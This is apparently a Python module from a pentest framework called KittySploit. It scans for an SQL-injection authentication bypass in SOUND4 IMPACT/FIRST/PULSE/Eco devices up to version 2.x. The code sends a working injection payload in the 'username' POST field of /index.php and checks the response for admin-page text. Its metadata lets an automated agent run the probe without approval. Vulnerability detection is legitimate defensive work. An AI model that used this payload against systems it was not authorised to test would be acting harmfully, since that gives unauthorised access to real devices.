#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The application suffers from an SQL Injection vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SOUND4 IMPACT/FIRST/PULSE/Eco <= 2.x - Authentication Bypass Detection',
        'description': "The application suffers from an SQL Injection vulnerability. Input passed through the 'username' POST parameter in 'index.php' is not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code and bypass the authentication mechanism.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'sqli', 'zeroscience', 'sound4', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5727.php'],
    }

    def run(self):
        path = '/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=%27%2Bjoxvy--%2Bz&password=ffesdf\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Network Diagnostic:', 'disconnect the user',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='SOUND4 IMPACT/FIRST/PULSE/Eco <= 2.x - Authentication Bypass detected', path=path)
            return True
        return False

